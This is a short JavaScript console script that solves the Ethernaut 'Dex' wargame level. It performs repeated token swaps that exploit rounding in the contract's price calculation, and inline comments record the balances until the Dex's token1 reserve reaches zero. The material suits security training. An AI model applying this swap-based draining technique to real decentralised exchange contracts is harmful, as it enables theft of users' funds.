```javascript
// Reference: https://medium.com/@this_post/ethernaut-22-dex-modified-version-writeups-4330c33a0743
await contract.approve(contract.address, web3.utils.toBN(200e18))
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 10
await contract.swap(await contract.token1(), await contract.token2(), 10)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 20
await contract.swap(await contract.token2(), await contract.token1(), 20)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 24
await contract.swap(await contract.token1(), await contract.token2(), 24)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 30
await contract.swap(await contract.token2(), await contract.token1(), 30)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 41
await contract.swap(await contract.token1(), await contract.token2(), 41)
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 65(65 * 110 / 45 = 158, Dex balance not enough, so next swap only pay 45 token2 and token1 will be drained)
await contract.swap(await contract.token2(), await contract.token1(), 45)
await contract.balanceOf(await contract.token1(), player).then(x=>x.toNumber())
// 110
await contract.balanceOf(await contract.token1(), contract.address).then(x=>x.toNumber())
// 0
await contract.balanceOf(await contract.token2(), player).then(x=>x.toNumber())
// 20
await contract.balanceOf(await contract.token2(), contract.address).then(x=>x.toNumber())
// 90
```